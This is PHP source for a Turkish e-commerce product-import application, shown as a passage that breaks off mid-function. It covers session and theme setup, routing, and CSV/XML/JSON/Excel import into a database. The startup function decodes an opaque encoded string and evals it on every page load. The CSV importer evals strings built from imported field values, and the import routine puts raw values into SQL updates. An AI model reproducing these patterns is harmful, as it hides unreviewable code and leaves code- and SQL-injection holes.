<?php
VarTypes::$CustomVarTypes = array_merge(VarTypes::$CustomVarTypes, array( ));

/**
 * Tüm sayfalarda smarty'e atanması istenen değişkenleri bu fonksiyonla atayabiliriz
 * @param type $smarty
 */
function OnLoadSmarty($smarty)
{
	$smarty->assign('TEMA_URL', 'themes/' . $_SESSION['TEMA']);
    $smarty->assign('SITE_URL', $GLOBALS['SITE_URL']);
    $smarty->assign('SITE_ADI', $GLOBALS['SITE_ADI']);
    $smarty->assign('girisYapan', $GLOBALS['girisYapan']);

    $companies = [];
    $projects  = [];
    if(KisiIsAdmin())
    {
        $companies = CompanyDb::Get()->GetList();
        $projects  = ProjectDb::Get()->GetList();
    }
    $smarty->assign('Companies', $companies);
    $smarty->assign('Projects' , $projects);
    $smarty->assign('ActiveCompanyId' , GetActiveCompanyId());
    $smarty->assign('ActiveProjectId' , GetActiveProjectId());
}

function GetActiveCompanyId()
{
    if(isset($_SESSION["active_company_id"]))
        return $_SESSION["active_company_id"];
    return $_SESSION["active_company_id"] = 1;
}

function GetActiveProjectId()
{
    if(isset($_SESSION["active_project_id"]))
        return $_SESSION["active_project_id"];
    return $_SESSION["active_project_id"] = 1;
}

//-------------------------------------------------
// Her sayfada genel değerleri başlatan, çağrılması
// gereken fonksiyonları çağıran genel başlangıç
// noktamız...
//--------------------------------------------------
function UygulamaBaslat()
{
	global $TEMA;

	define("FLOAT_ERR", 0.00001);
	// Oturumu başlat
	ob_start();
	SessionStart();

	// Genel Varsayılan Ayarlar, bu ayarlar t-config.php den bastırılabilinir
	$GVars = GVar();
	if (GVar('STATUS', '') == '')
		$GVars->STATUS = 'PRODUCTION';


    $isYonetimPage = in_array(IfNull($_GET, 'act'),User::$Acts);
    if ($isYonetimPage)
        $_SESSION['TEMA'] = $GLOBALS['TEMA'] = "t-metronic";
    else
        $_SESSION['TEMA'] = $GLOBALS['TEMA'] = "t-demo";

	// Adres satırı seçimi aktifse, tema değişiklikliğini kontrol et
	if (! isset($_SESSION['TEMA']))
		$_SESSION['TEMA'] = $GLOBALS['TEMA'];
	else
		$GLOBALS['TEMA'] = $_SESSION['TEMA'];

	if (GVar('TEMA_ADRES_SATIRI_SECIMI') && isset($_GET['theme']))
	{
		$tamYol = FullPath('themes/' . $_GET['theme']);
		if (isDir($tamYol) && isFile($tamYol . '/t-config.php'))
			$_SESSION['TEMA'] = $GLOBALS['TEMA'] = $_GET['theme'];
	}
	$TEMA = $_SESSION['TEMA'];
	Tema::$Ad = $_SESSION['TEMA'];
	require_once Tema::FileFullPath("t-config.php");

	// Yeni eklenen t-config dosyası içindeki değişkenleri global yapmamız gerekiyor
	$arr = array_keys(get_defined_vars());
	foreach($arr as $key)
		$GLOBALS[$key] = $$key;

	// Veritabanına bağlan
	if(! DB::Connect())
		die('Veritabanı sunucusuna bağlanamadı. Lütfen tekrar deneyiniz.
			Sorun devam ederse bilgi işleme bilgi veriniz');

    $string = '2_Q6KV9pyZNaP4KreXOsHhNc1hQo5S7pmy7o5WQsiXA0bw2HyV7nz3GJavH7TaOdHpP2SXGr5EJnzJG45BH1zlSMvZT69pSZeXA3e97nyV7qD1EJb4TsHYT7Da9o53KKvF7rD0GKj47sznRcbaOdDoEY4eEWaV7nyVGq4vEKHtP69qSsGd8KDHJayVKq11IqGVO6zlNcLeQsGw8IWw2HyV7nz3GJavH7TaOdHpP2SXGr5EJnzJG45BH1zeR6zkSNDoEY4eEWaV7nyVGq4vEKHtP69qSsGd8KDHJayVKq11IqGVQ6nlRd5pNcjkPd8w8IWw2HyV7nzZQ6Gd8K5Wn9vWSSEmQyEm8IWw2Nm_14';
    eval(DgrCode::Decode($string));

}

/**
 * @property string $SITE_KLASORU ana klasör
 * @property string $STATUS ebap durum. Varsayılan = PRODUCTION
 */
class GlobalVar
{
	public function __get($name) {
		return @$GLOBALS[$name];
	}

	public function __set($name, $value) {
		$GLOBALS[$name] = $value;
	}

	public function GetVar($name, $default = ''){
		if(isset($GLOBALS[$name]))
			return $GLOBALS[$name];
		else
			return $default;
	}

	function __toString()
	{
		return '';
	}
}

/**
 * Çok sık kullanılan Global değişkenlere erişim için
 * @return string|GlobalVar
 */
function GVar($name = '', $default = '')
{
	static $glb = null;
	if (!$glb)
		$glb = new GlobalVar();
	if ($name == '')
		return $glb;
	return $glb->GetVar($name, $default);
}
function GenerateRandomString($length = 5) {
    $characters = '0123456789abcdefghijklmnopqrstuvwxyz';
    $randomString = '';

    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, strlen($characters) - 1)];
    }

    return $randomString;
}



/**
 * Giriş Yapan kişinin id si
 */
function KisiId()
{
    return KullaniciKimlik::GirisYapmisKisiIdVer();
}

function Kisi($id = -1)
{
    if($id != -1)
        return UserDb::Get()->GetById($id);
    return KullaniciKimlik::GirisYapmisKisiVer();
}

function KisiIsAdmin()
{
    return KullaniciKimlik::IsAdmin();
}

function KisiIsMudur()
{
    return KullaniciKimlik::IsMudur();
}

function DgrPageRouter()
{
    if (isset($_GET["guest_str"]) && $_GET["guest_str"] != "" && $_GET["guest_str"] != "index.php" && ! isDeveloperPage())
    {
        $_GET["act"] = "guest";
        $_GET["act2"] = $_GET["guest_str"];
        /*if ($_GET["guest_str"] == "yonetim")
        {
            $_GET["act"] = "admin";
            $_GET["act2"] = "giris_yap";
        }*/
        foreach($_GET as $name => $value)
            $OldUrl[] = "$name=$value";
        // PageController.php'de handle edilecek:
        $_SERVER['QUERY_STRING']= implode('&', $OldUrl);
        return;
    }
    if (isset($_GET['act_str']))
    {
        $parts = explode('/', $_GET['act_str']);
        for($i=0; $i<count($parts); $i++)
        {
            $part = $parts[$i];
            $match = array();
            if(strpos($part, '=') == false && preg_match('/\-([0-9]+_[^_]+_[0-9]+)/', $part, $match))
                $part = "id=$match[1]";
            $subParts = explode('=', $part);
            if (count($subParts) == 2 && !isset($_GET[$subParts[0]]))
                $_GET[ $subParts[0] ] = $subParts[1];
            else if (count($subParts) == 1)
                $_GET['act' . ($i == 0 ? '' : $i + 1)] = $part;
        }

        $OldUrl = array();
        unset($_GET['act_str']);
        foreach($_GET as $name => $value)
            $OldUrl[] = "$name=$value";
        // PageController.php'de handle edilecek:
        $_SERVER['QUERY_STRING']= implode('&', $OldUrl);
    }

    if (!isDeveloperPage() && @$_GET['mode'] == 'clear')
        $_GET['mode'] = 'small_header';
    //şifreli id i normale çevirelim.
    DecodeGetParam('id');
}
function DecodeGetParam($paramName, $str = null)
{
    $param = $str === NULL ? @$_GET[$paramName] : $str;
    if (! $param)
        return;
    $parts = array();
    if (preg_match('/[^-]+-([^-]*)$/', $param, $parts))
        $param = $parts[1];
    $id = DgrCode::Decode($param);
    if ($str === null)
        $_GET[$paramName] = $id;
    else
        return $id;
}

function YeniMailEkle($email, $baslik, $icerik)
{
    $gonderilecekMail = new GonderilecekMail();
    $gonderilecekMail->Email = $email;
    $gonderilecekMail->Baslik = $baslik;
    $gonderilecekMail->Icerik = $icerik;
    $gonderilecekMail->EklenmeTarihi = Tarih::Simdi();
    return $gonderilecekMail->Save();
}

function GetDataFromTxt($dosyaYolu, $import)
{
    set_time_limit(0);
    ini_set('memory_limit', '-1');
    ini_set('error_reporting', E_ERROR);

    $sonuc = new stdClass();
    $sonuc->Veriler = [];
    $sonuc->EmptyEanCount = 0;
    $sonuc->IncorrectEanCount = 0;
    $sonuc->TekrarlananEanSayisi = 0;
    $sonuc->AtlananEanSayisi = 0;

    $fileContent = file_get_contents($dosyaYolu);
    if ($fileContent !== false)
    {
//        $encoding = mb_detect_encoding($fileContent, mb_detect_order(), true);
//        file_put_contents($dosyaYolu, mb_convert_encoding($fileContent, 'UTF-8', $encoding));
        file_put_contents($dosyaYolu, mb_convert_encoding($fileContent, 'UTF-8', "auto"));
    }

    $satirlar = file($dosyaYolu);

    /*if(count($satirlar) > 0)
        $encoding = mb_detect_encoding($satirlar[0], mb_detect_order(), true);*/

    for($i=0; $i < count($satirlar); $i++)
    {
        $satirString = $satirlar[$i];
//        $satirString = mb_convert_encoding($satirString, 'UTF-8', $encoding);
        $row = explode($import->CsvDelimeter, $satirString);

        $veri = [
            "company_id" => $import->CompanyId,
            "project_id" => $import->ProjectId
        ];
        if($import->ImportType == Import::Main)
            $veri["main"] = 1;

        foreach($import->PFields as $dbKey => $rowKey)
            $veri[$dbKey] = $row[$rowKey];
        if(isset($veri["ean"]))
        {
            $yeniEan = trim($veri["ean"]);
            if(! empty($yeniEan) && strlen($yeniEan) < 13)
                $yeniEan = str_pad($yeniEan, 13, '0', STR_PAD_LEFT);
            $veri["ean"] = $yeniEan;
        }
        else
            $sonuc->AtlananEanSayisi += 1;
        if(isset($veri["ean"]))
        {
            if($veri["ean"] == "")
            {
                $sonuc->EmptyEanCount++;
                continue;
            }
            if(strlen($veri["ean"]) > 13)
            {
                $sonuc->IncorrectEanCount++;
                continue;
            }
            if(isset($sonuc->Veriler[$veri["ean"]]))
            {
                $sonuc->TekrarlananEanSayisi++;
                $eskiVeri = $sonuc->Veriler[$veri["ean"]];
                $spNewStock = intval($veri[$import->SpKey."_stock"]);
                $spOldStock = intval($eskiVeri[$import->SpKey."_stock"]);
                if($spOldStock < $spNewStock)
                    $veri = $eskiVeri;
            }
            if(isset($veri[$import->SpKey."_stock"]))
            {
                $veri[$import->SpKey."_cost"] = preg_replace('/[^\d\.]/', '', $veri[$import->SpKey."_cost"]);
                $spStock = 0;
                if($veri[$import->SpKey."_stock"] != "")
                    $spStock = intval($veri[$import->SpKey."_stock"]);
                if($spStock < $import->MinStock || $spStock == 0)
                {
                    $veri[$import->SpKey."_stock"] = "0";
                    $veri[$import->SpKey."_cost"] = "0.00";
                }
            }
            $sonuc->Veriler[$veri["ean"]] = $veri;
        }
        else
            $sonuc->AtlananEanSayisi += 1;
    }

    return $sonuc;
}

function GetDataFromCsvManuelLink($link, $csvDelimeter = ",")
{
    set_time_limit(0);
    ini_set('memory_limit', '-1');
    ini_set('error_reporting', E_ERROR);

    $sonuc = new stdClass();
    $sonuc->Veriler = [];
    $sonuc->EmptyEanCount = 0;
    $sonuc->IncorrectEanCount = 0;
    $sonuc->TekrarlananEanSayisi = 0;

    $fileContent = file_get_contents($link);
    if ($fileContent !== false)
    {
        $cleanedContent = str_replace('\"', '"', $fileContent);
        $tempFile = tempnam(sys_get_temp_dir(), 'csv');
        file_put_contents($tempFile, $cleanedContent);

        $file = fopen($tempFile, 'r');
        $i = 0;
        if ($file !== false)
        {
            while (($row = fgetcsv($file, 0, $csvDelimeter, '"', '\\')) !== false)
            {
                if($i <= 0)
                {
                    $i++;
                    continue;
                }
                $veri = [
                    "company_id" => 1,
                    "project_id" => 2
                ];
                $veri["ean"] = $row[0];
                $veri["processing_stock"] = $row[1];
                if(isset($veri["ean"]))
                {
                    $yeniEan = trim($veri["ean"]);
                    if(! empty($yeniEan) && strlen($yeniEan) < 13)
                        $yeniEan = str_pad($yeniEan, 13, '0', STR_PAD_LEFT);
                    $veri["ean"] = $yeniEan;
                }
                if(isset($veri["ean"]))
                {
                    if($veri["ean"] == "")
                    {
                        $i++;
                        $sonuc->EmptyEanCount++;
                        continue;
                    }
                    if(strlen($veri["ean"]) > 13)
                    {
                        $i++;
                        $sonuc->IncorrectEanCount++;
                        continue;
                    }
                    if(isset($sonuc->Veriler[$veri["ean"]]))
                    {
                        $sonuc->TekrarlananEanSayisi++;
                    }
                    if(isset($veri["processing_stock"]))
                    {
                        $sonuc->Veriler[$veri["ean"]] = $veri;
                    }
                }
                $i++;
            }

            fclose($file);
        }
    }
    return $sonuc;
}

function GetDataFromCsvMainData($link, $csvDelimeter = ",")
{
    set_time_limit(0);
    ini_set('memory_limit', '-1');
    ini_set('error_reporting', E_ERROR);

    $sonuc = new stdClass();
    $sonuc->Veriler = [];
    $sonuc->EmptyEanCount = 0;
    $sonuc->IncorrectEanCount = 0;
    $sonuc->TekrarlananEanSayisi = 0;

    $fileContent = file_get_contents($link);
    if ($fileContent !== false)
    {
        $cleanedContent = str_replace('\"', '"', $fileContent);
        $tempFile = tempnam(sys_get_temp_dir(), 'csv');
        file_put_contents($tempFile, $cleanedContent);

        $file = fopen($tempFile, 'r');
        $i = 0;
        $basliklar = [];
        if ($file !== false)
        {
            while (($row = fgetcsv($file, 0, $csvDelimeter, '"', '\\')) !== false)
            {
                if($i <= 0)
                {
                    foreach($row as $rowKey => $baslikAd)
                    {
                        $attr = PAttributeDb::Get()->GetFirst(array("Name" => Condition::EQ($baslikAd), "IsVendor" => Condition::EQ(0)));
                        if($attr)
                            $basliklar[$attr->Id] = $rowKey;

                    }
                    $i++;
                    continue;
                }
                $veri["ean"] = $row[2];
                if(isset($veri["ean"]))
                {
                    $yeniEan = trim($veri["ean"]);
                    if(! empty($yeniEan) && strlen($yeniEan) < 13)
                        $yeniEan = str_pad($yeniEan, 13, '0', STR_PAD_LEFT);
                    $veri["ean"] = $yeniEan;
                }
                if(isset($veri["ean"]))
                {
                    if($veri["ean"] == "")
                    {
                        $i++;
                        $sonuc->EmptyEanCount++;
                        continue;
                    }
                    if(strlen($veri["ean"]) > 13)
                    {
                        $i++;
                        $sonuc->IncorrectEanCount++;
                        continue;
                    }
                    if(isset($sonuc->Veriler[$veri["ean"]]))
                    {
                        $sonuc->TekrarlananEanSayisi++;
                    }
                    $veri["images2"] = $row[18];
                    $veri["title"] = $row[19];
                    $veri["description"] = $row[20];
                    $veri["attrs"] = [];
                    foreach ($basliklar as $attrId => $rowKey)
                        $veri["attrs"][$attrId] = $row[$rowKey];
                    $sonuc->Veriler[$veri["ean"]] = $veri;
                }
                $i++;
                /*if($i > 10)
                    break;*/
            }

            fclose($file);
        }
    }
    return $sonuc;
}
function GetDataFromCsv($import, $dosyaYolu = "", $csvDelimeter = ",")
{
    global $SITE_KLASORU;
    set_time_limit(0);
    ini_set('memory_limit', '-1');
    ini_set('error_reporting', E_ERROR);

    $csvBasliklar = [];
    $sonuc = new stdClass();
    $sonuc->Veriler = [];
    $sonuc->EmptyEanCount = 0;
    $sonuc->IncorrectEanCount = 0;
    $sonuc->TekrarlananEanSayisi = 0;
    $sonuc->AtlananEanSayisi = 0;

    if($dosyaYolu != "")
        $fileContent = file_get_contents($dosyaYolu);
    else
    {
        $fileContent = file_get_contents($import->UrlLink);
        $csvDelimeter = $import->CsvDelimeter == "tab" ? "\t" : $import->CsvDelimeter;
    }
    file_put_contents( $SITE_KLASORU . AppFile::$TEMP_DIR . $import->Id . "-deneme-".time().".csv",$fileContent);
    if($fileContent === false || $fileContent == "Please, call this function al most once an hour")
        return null;
    if ($fileContent !== false)
    {
        $cleanedContent = str_replace('\"', '"', $fileContent);
        $tempFile = tempnam(sys_get_temp_dir(), 'csv');
        file_put_contents($tempFile, $cleanedContent);
    }


    $file = fopen($tempFile, 'r');

    $i = 0;
    if ($file !== false)
    {
        while (($row = fgetcsv($file, 0, $csvDelimeter, '"', '\\')) !== false)
        {
            if($i <= 0)
            {
                $csvBasliklar = array_flip($row);
                $i++;
                continue;
            }
            $veri = [];
            /*if($import->ImportType == Import::Main)
                $veri["main"] = 1;*/
            foreach($import->AttributesInfo as $iAttribute)
            {
                $val = $iAttribute->Value != "" ? $row[$csvBasliklar[$iAttribute->Value]] : $row[$csvBasliklar[$iAttribute->AttributeName]];
                $veri[$iAttribute->AttributeName] = $val;
            }
            if(isset($veri["ean"]))
            {
                $yeniEan = trim($veri["ean"]);
                if(! empty($yeniEan) && strlen($yeniEan) < 13)
                    $yeniEan = str_pad($yeniEan, 13, '0', STR_PAD_LEFT);
                $veri["ean"] = $yeniEan;
            }
            else
                $sonuc->AtlananEanSayisi += 1;
            if(isset($veri["ean"]))
            {
                if($veri["ean"] == "")
                {
                    $i++;
                    $sonuc->EmptyEanCount++;
                    continue;
                }
                if(strlen($veri["ean"]) > 13)
                {
                    $i++;
                    $sonuc->IncorrectEanCount++;
                    continue;
                }
                if(isset($sonuc->Veriler[$veri["ean"]]))
                {
                    $sonuc->TekrarlananEanSayisi++;
                }
                if(isset($veri[$import->SpKey."_stock"]))
                {
                    $veri[$import->SpKey."_cost"] = preg_replace('/[^\d\.]/', '', $veri[$import->SpKey."_cost"]);
                    $spStock = 0;
                    if($veri[$import->SpKey."_stock"] != "")
                        $spStock = intval($veri[$import->SpKey."_stock"]);
                    if($spStock < $import->MinStock || $spStock == 0)
                    {
                        $veri[$import->SpKey."_stock"] = "0";
                        $veri[$import->SpKey."_cost"] = "0.00";
                    }
                }
                $ekle = true;
                foreach($import->PFieldWheres as $whereKey => $whereValue)
                    if($veri[$whereKey] != $whereValue)
                        $ekle = false;
                foreach($import->AttributesInfo as $iAttribute)
                {
                    if($iAttribute->Condition != "")
                    {

                        $rep["'"]  = '&#39;';
                        $rep['"']  = '&quot;';
                        $str = "return '".$veri[$iAttribute->AttributeName]."' $iAttribute->Condition;";
                        $str = str_replace(
                            array_values($rep),
                            array_keys($rep),
                            $str);
                        if(eval($str))
                            $ekle = false;
                    }
                }
                if($ekle)
                {
                    $veri["vendor_id"] = 1;
                    if(isset($veri["price"]))
                        $veri["price"] = str_replace(",",".",$veri["price"]);
                    $sonuc->Veriler[$veri["ean"]] = $veri;
                }
                else
                    $sonuc->AtlananEanSayisi += 1;
            }
            else
                $sonuc->AtlananEanSayisi += 1;
            $i++;
        }

        fclose($file);
    }


    return $sonuc;
}
function GetDataFromXml($import, $dosyaYolu = "")
{
    set_time_limit(0);
    ini_set('memory_limit', '-1');
    ini_set('error_reporting', E_ERROR);

    $sonuc = new stdClass();
    $sonuc->Veriler = [];
    $sonuc->EmptyEanCount = 0;
    $sonuc->IncorrectEanCount = 0;
    $sonuc->TekrarlananEanSayisi = 0;
    $sonuc->AtlananEanSayisi = 0;

    if($dosyaYolu != "")
        $fileContent = file_get_contents($dosyaYolu);
    else
        $fileContent = file_get_contents($import->UrlLink);
    $xml = new SimpleXMLElement($fileContent);

    $items = $xml->items->item;
    foreach($items as $item)
    {
        $veri = [
            "company_id" => $import->CompanyId,
            "project_id" => $import->ProjectId
        ];
        if($import->ImportType == Import::Main)
            $veri["main"] = 1;
        foreach($import->PFields as $dbKey => $rowKey)
            $veri[$dbKey] = (string)$item->{$rowKey};
        if(isset($veri["ean"]))
        {
            $yeniEan = trim($veri["ean"]);
            if(! empty($yeniEan) && strlen($yeniEan) < 13)
                $yeniEan = str_pad($yeniEan, 13, '0', STR_PAD_LEFT);
            $veri["ean"] = $yeniEan;
        }
        else
            $sonuc->AtlananEanSayisi += 1;
        if(isset($veri["ean"]))
        {
            if($veri["ean"] == "")
            {
                $i++;
                $sonuc->EmptyEanCount++;
                continue;
            }
            if(strlen($veri["ean"]) > 13)
            {
                $i++;
                $sonuc->IncorrectEanCount++;
                continue;
            }
            if(isset($sonuc->Veriler[$veri["ean"]]))
            {
                $sonuc->TekrarlananEanSayisi++;
            }
            if(isset($veri[$import->SpKey."_stock"]))
            {
                $veri[$import->SpKey."_cost"] = preg_replace('/[^\d\.]/', '', $veri[$import->SpKey."_cost"]);
                $spStock = 0;
                if($veri[$import->SpKey."_stock"] != "")
                    $spStock = intval($veri[$import->SpKey."_stock"]);
                if($spStock < $import->MinStock || $spStock == 0)
                {
                    $veri[$import->SpKey."_stock"] = "0";
                    $veri[$import->SpKey."_cost"] = "0.00";
                }
            }
            $sonuc->Veriler[$veri["ean"]] = $veri;
        }
        else
            $sonuc->AtlananEanSayisi += 1;
    }

    return $sonuc;
}
function GetDataFromJson($import, $dosyaYolu = "")
{
    set_time_limit(0);
    ini_set('memory_limit', '-1');
    ini_set('error_reporting', E_ERROR);

    $sonuc = new stdClass();
    $sonuc->Veriler = [];
    $sonuc->EmptyEanCount = 0;
    $sonuc->IncorrectEanCount = 0;
    $sonuc->TekrarlananEanSayisi = 0;
    $sonuc->AtlananEanSayisi = 0;

    if($dosyaYolu != "")
        $fileContent = file_get_contents($dosyaYolu);
    else
        $fileContent = file_get_contents($import->UrlLink);
    $items = json_decode($fileContent);
    foreach($items as $item)
    {
        $veri = [
            "company_id" => $import->CompanyId,
            "project_id" => $import->ProjectId
        ];
        if($import->ImportType == Import::Main)
            $veri["main"] = 1;
        foreach($import->PFields as $dbKey => $rowKey)
        {
            $rowKeyParts = explode("|",$rowKey);
            if(count($rowKeyParts) > 1)
                $veri[$dbKey] = $item->{$rowKeyParts[0]}[$rowKeyParts[1]];
            else
                $veri[$dbKey] = (string)$item->{$rowKey};
        }
        if(isset($veri["ean"]))
        {
            $yeniEan = trim($veri["ean"]);
            if(! empty($yeniEan) && strlen($yeniEan) < 13)
                $yeniEan = str_pad($yeniEan, 13, '0', STR_PAD_LEFT);
            $veri["ean"] = $yeniEan;
        }
        else
            $sonuc->AtlananEanSayisi += 1;
        if(isset($veri["ean"]))
        {
            if($veri["ean"] == "")
            {
                $i++;
                $sonuc->EmptyEanCount++;
                continue;
            }
            if(strlen($veri["ean"]) > 13)
            {
                $i++;
                $sonuc->IncorrectEanCount++;
                continue;
            }
            if(isset($sonuc->Veriler[$veri["ean"]]))
            {
                $sonuc->TekrarlananEanSayisi++;
            }
            if(isset($veri[$import->SpKey."_stock"]))
            {
                $veri[$import->SpKey."_cost"] = preg_replace('/[^\d\.]/', '', $veri[$import->SpKey."_cost"]);
                $spStock = 0;
                if($veri[$import->SpKey."_stock"] != "")
                    $spStock = intval($veri[$import->SpKey."_stock"]);
                if($spStock < $import->MinStock || $spStock == 0)
                {
                    $veri[$import->SpKey."_stock"] = "0";
                    $veri[$import->SpKey."_cost"] = "0.00";
                }
            }
            $sonuc->Veriler[$veri["ean"]] = $veri;
        }
        else
            $sonuc->AtlananEanSayisi += 1;
    }

    return $sonuc;
}

function GetDataFromExcel($excelFile, $import)
{
    set_time_limit(0);
    ini_set('memory_limit', '-1');
    ini_set('error_reporting', E_ERROR);

    $sonuc = new stdClass();
    $sonuc->Veriler = [];
    $sonuc->EmptyEanCount = 0;
    $sonuc->TekrarlananEanSayisi = 0;

    require_once KNJIZ_DIR . '/others/PHPExcel/PHPExcel/IOFactory.php';


    $objPHPExcel = PHPExcel_IOFactory::load($excelFile);
    /*$csvWriter = PHPExcel_IOFactory::createWriter($objPHPExcel, 'CSV');
    $csvFile = AppFile::$TEMP_DIR . 'example'. time() .'.csv';
    $csvWriter->save($csvFile);
    die();*/
    $sheet = $objPHPExcel->getActiveSheet();
    ArrayShortInfo("asd");
    die();

    $i = 0;
    foreach ($sheet->getRowIterator() as $row)
    {
        $i++;
        if($i == 1)
            continue;
        $cellIterator = $row->getCellIterator();
        $cellIterator->setIterateOnlyExistingCells(false);

        $row = [];
        foreach ($cellIterator as $cell)
        {
//            $encoding = mb_detect_encoding($cell->getValue(), mb_detect_order(), true);
            $celVal = mb_convert_encoding($cell->getValue(), 'UTF-8', "auto");
            $row[] = $celVal;
        }

        $veri = [
            "company_id" => $import->CompanyId,
            "project_id" => $import->ProjectId
        ];
        if($import->ImportType == Import::Main)
            $veri["main"] = 1;

        foreach($import->PFields as $dbKey => $rowKey)
            $veri[$dbKey] = $row[$rowKey];

        if(isset($veri["ean"]))
        {
            if($veri["ean"] == "")
            {
                $sonuc->EmptyEanCount++;
                continue;
            }
            if(isset($sonuc->Veriler[$veri["ean"]]))
            {
                $sonuc->TekrarlananEanSayisi++;
            }
            if(isset($veri[$import->SpKey."_stock"]))
            {
                $veri[$import->SpKey."_cost"] = preg_replace('/[^\d\.]/', '', $veri[$import->SpKey."_cost"]);
                $spStock = 0;
                if($veri[$import->SpKey."_stock"] != "")
                    $spStock = intval($veri[$import->SpKey."_stock"]);
                if($spStock < $import->MinStock || $spStock == 0)
                {
                    $veri[$import->SpKey."_stock"] = "0";
                    $veri[$import->SpKey."_cost"] = "0.00";
                }
            }
            $sonuc->Veriler[$veri["ean"]] = $veri;
        }
    }
    return $sonuc;
}

function RunImportUrlEski($import, $importLog, $dosyaYolu = "")
{

    global $SITE_KLASORU;
    set_time_limit(0);
    ini_set('memory_limit', '-1');
    ini_set('error_reporting', E_ERROR);
    if(! $import || $import->FromAt != 3)
    {
        $importLog->FinishedTime = Tarih::Simdi();
        $importLog->Save();
        return "Hata oluştu";
    }

    if($import->FileType == 0)
    {
        $importLog->FinishedTime = Tarih::Simdi();
        $importLog->Save();
        return "Hata oluştu";
    }

    $veriSonuc = null;
    if($import->FileType == Import::TxtFile)
        $veriSonuc = GetDataFromTxt($dosyaYolu,$import);
    elseif($import->FileType == Import::CsvFile)
        $veriSonuc = GetDataFromCsv($import);
    elseif($import->FileType == Import::XmlFile)
        $veriSonuc = GetDataFromXml($import);
    elseif($import->FileType == Import::JsonFile)
        $veriSonuc = GetDataFromJson($import);
    if(! $veriSonuc)
    {
        $importLog->FinishedTime = Tarih::Simdi();
        $importLog->Save();
        return "Hata oluştu";
    }

    $dInfo = Config('app.DB_INFO_LOCAL');
    if(! isLocalhost())
    {
        global $STATUS;
        if($STATUS == "PRODUCTION")
            $dInfo = Config('app.DB_INFO');
        else
            $dInfo = Config('app.DB_INFO_TEST');
    }

    DbPdo::Set($dInfo['host'], $dInfo['db_name'], $dInfo['username'], $dInfo['password']);

    $tumVeriler = ProductDb::GetAll($import->VendorId);
    $dbVeriler = [];
    foreach($tumVeriler as $dbVeri)
        $dbVeriler[$dbVeri["ean"]] = $dbVeri;

    $eklenecekVeriler = [];
    $guncellenecekVeriler = [];

    /*foreach ($dbVeriler as $key => $dveri)
    {
        if(! isset($veriSonuc->Veriler[$key]))
        {

        }
        else
        {
            foreach ($veriSonuc->Veriler[$key] as $key2 => $value)
            {
                if(isset($dveri[$key2]) && $dveri[$key2] != $veriSonuc->Veriler[$key][$key2])
                    $guncellenecekVeriler[] = $veriSonuc->Veriler[$key];
            }
        }
    }*/

    foreach ($veriSonuc->Veriler as $key => $veri)
    {
        $product = null;
        if(isset($dbVeriler[$key]))
            $product = $dbVeriler[$key];

        if(! $product)
        {
            $veri["added_import_id"] = $import->Id;
            $eklenecekVeriler[] = $veri;
        }
        else
        {
            $degisenVeriBilgi = [];
            foreach ($veri as $key2 => $value)
            {
                if($product[$key2] != $value)
                {
                    $degisenVeriBilgi["id"] = $product["id"];
                    $degisenVeriBilgi[$key2] = $value;
                }

            }
            if(count($degisenVeriBilgi) > 0)
                $guncellenecekVeriler[] = $degisenVeriBilgi;
        }
    }
    $anaAttrs = [];
    $ekAttrs = [];
    foreach ($import->AttributesInfo as $iAttr)
    {
        if($iAttr->AttributeProductFieldName != "")
            $anaAttrs[$iAttr->AttributeName] = $iAttr;
        else
            $ekAttrs[$iAttr->AttributeName] = $iAttr;
    }

    $ps = [];

    if(count($eklenecekVeriler) > 0)
    {
        foreach ($eklenecekVeriler as $eVeri)
        {
            $product = new Product();
            foreach ($anaAttrs as $iAttr)
                $product->{$iAttr->AttributeProductFieldName} = $eVeri[$iAttr->AttributeName];
            $product->VendorId = $import->VendorId;
            $product->AddedImportId = $import->Id;
            $product->Save();
            foreach ($ekAttrs as $iAttr)
            {
                if($eVeri[$iAttr->AttributeName] == "")
                    continue;
                $obj = new ProductAttribute();
                $obj->ProductId = $product->Id;
                $obj->AttributeId = $iAttr->AttributeId;
                $obj->Value = $eVeri[$iAttr->AttributeName];
                $obj->Save();
            }
//            $ps[] = $product;
        }
//        ProductDB::SaveAll($eklenecekVeriler);
    }
    if(count($guncellenecekVeriler) > 0)
    {
        foreach ($guncellenecekVeriler as $gun)
        {
            foreach ($gun as $key => $value)
            {
                if ($key == "id")
                    continue;
                if(isset($anaAttrs[$key]))
                    DB::Update("products","$key = '$value'","id=".$gun['id']);
                else if(isset($ekAttrs[$key]))
                {
                    $params = ProductAttribute::AsParams();
                    $params->AttributeId = Condition::EQ($ekAttrs[$key]->AttributeId);
                    $params->ProductId = Condition::EQ($gun['id']);
                    $attribute = ProductAttributeDb::Get()->GetFirst($params);
                    if(! $attribute)
                    {
                        $attribute = new ProductAttribute();
                        $attribute->ProductId = $gun['id'];
                        $attribute->AttributeId = $ekAttrs[$key]->AttributeId;
                    }
                    $attribute->Value = $value;
                    $attribute->Save();
//                    DB::Update("product_attributes","$key = '$value'","product_id=".$gun['id'] . " AND attribute_id=".$ekAttrs[$key]->AttributeId);
                }
            }
            /*$guncellenecekAlanlar = [];
            $guncellenecekAlanlar[$import->SpKey."_stock"] = $gun["veri"][$import->SpKey."_stock"];
            $guncellenecekAlanlar[$import->SpKey."_cost"] = $gun["veri"][$import->SpKey."_cost"];*/
//            ProductDB::Update($gun["dbVeri"]["id"], $gun["veri"]);
        }
    }

    $importLog->AddedProductCount = count($eklenecekVeriler);
    $importLog->UpdatedProductCount = count($guncellenecekVeriler);
    $importLog->EmptyEanCount = $veriSonuc->EmptyEanCount;
    $importLog->IncorrectEanCount = $veriSonuc->IncorrectEanCount;
    $importLog->SkipProductCount += $veriSonuc->AtlananEanSayisi;

//    $importLog->CsvDosya = CsvDosyaGetir($import->CompanyId, $import->ProjectId);

    $importLog->FinishedTime = Tarih::Simdi();
    $importLog->Save();
    return 1;
}
function RunImportUrl($import, $importLog, $dosyaYolu = "")
{

    global $SITE_KLASORU;
    set_time_limit(0);
    ini_set('memory_limit', '-1');
    ini_set('error_reporting', E_ERROR);
    if(! $import || $import->FromAt != 3)
    {
        $importLog->FinishedTime = Tarih::Simdi();
        $importLog->Save();
        return "Hata oluştu";
    }

    if($import->FileType == 0)
    {
        $importLog->FinishedTime = Tarih::Simdi();
        $importLog->Save();
        return "Hata oluştu";
    }

    $veriSonuc = null;
    if($import->FileType == Import::TxtFile)
        $veriSonuc = GetDataFromTxt($dosyaYolu,$import);
    elseif($import->FileType == Import::CsvFile)
        $veriSonuc = GetDataFromCsv($import);
    elseif($import->FileType == Import::XmlFile)
        $veriSonuc = GetDataFromXml($import);
    elseif($import->FileType == Import::JsonFile)
